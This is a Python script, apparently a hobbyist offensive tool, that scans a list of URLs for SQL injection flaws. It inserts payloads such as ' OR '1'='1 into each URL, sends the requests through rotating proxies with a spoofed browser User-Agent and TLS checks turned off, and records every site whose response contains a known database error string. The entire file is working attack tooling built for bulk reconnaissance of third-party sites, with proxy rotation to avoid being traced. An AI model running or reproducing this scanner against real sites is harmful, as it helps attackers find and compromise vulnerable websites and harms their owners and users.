import requests
import re
import sys
import argparse
from itertools import cycle
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



class SQLInjectionChecker:

    def __init__(self, proxy_list, timeout=10):
        self.proxies = proxy_list
        self.timeout = timeout
        self.proxy_cycle = cycle(proxy_list)

    def get_next_proxy(self):
        return next(self.proxy_cycle)

    def check_sql_injection(self, url):
        sql_errors =[
    # MySQL errors
    "syntax error",
    "sql syntax",
    "mysql_fetch",
    "mysql_fetch_array",
    "sql error",
    "you have an error in your sql syntax",

    # PostgreSQL errors
    "syntax error at or near",
    "query failed",
    "pg_query",
    "pg_exec",
    "column reference is ambiguous",

    # SQL Server errors
    "unclosed quotation mark",
    "incorrect syntax near",
    "invalid column name",
    "incorrect syntax near the keyword",
    "incorrect syntax near the keyword 'JOIN'",

    # Oracle errors
    "ORA-00900",
    "ORA-00933",
    "ORA-00942",
    "ORA-01756",
    "table or view does not exist",

    # SQLite errors
    "near \"[TOKEN]\": syntax error",
    "no such table",
    "no such column",
    "sqlite3_prepare",
    "sqlite3_step",
       ]


        payloads = [
            "'",
            "''",
            "' OR '1'='1",
            "1' OR '1'='1",
            "1 OR 1=1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            "1' OR 1=1 --",
        ]

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }

        try:
            for payload in payloads:
                injected_url = url.replace("[t]", payload)
                proxy = self.get_next_proxy()
                response = requests.get(injected_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=self.timeout, verify=False)

                for error in sql_errors:
                    if re.search(error, response.text, re.IGNORECASE):
                        return True
        except requests.exceptions.RequestException as e:
            print(f"Error while sending request to {url}: {e}")

        return False

def main(args):
    print("Made With Love By Th3 Gr34T F4LC0N")
    input("Press Enter to start checking URLs...")

    proxy_list = args.proxies.split(',')

    checker = SQLInjectionChecker(proxy_list, args.timeout)

    with open(args.urls, "r") as f:
        urls = f.readlines()

    results = []

    for url in urls:
        url = url.strip()
        if checker.check_sql_injection(url):
            print(f"{url} might be SQL injectable.")
            results.append(url)
        else:
            print(f"{url} seems not to be SQL injectable.")

    with open(args.output, "w") as f:
        for result in results:
            f.write(f"{result}\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Checker")
    parser.add_argument("--urls", type=str, default="urls.txt", help="Path to the file containing URLs")
    parser.add_argument("--proxies", type=str, default="http://127.0.0.1:24000,http://127.0.0.1:24001,http://127.0.0.1:24002", help="Comma-separated list of proxies")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--output", type=str, default="result.txt", help="Output file for saving SQL injectable URLs")

    args = parser.parse_args()
    main(args)
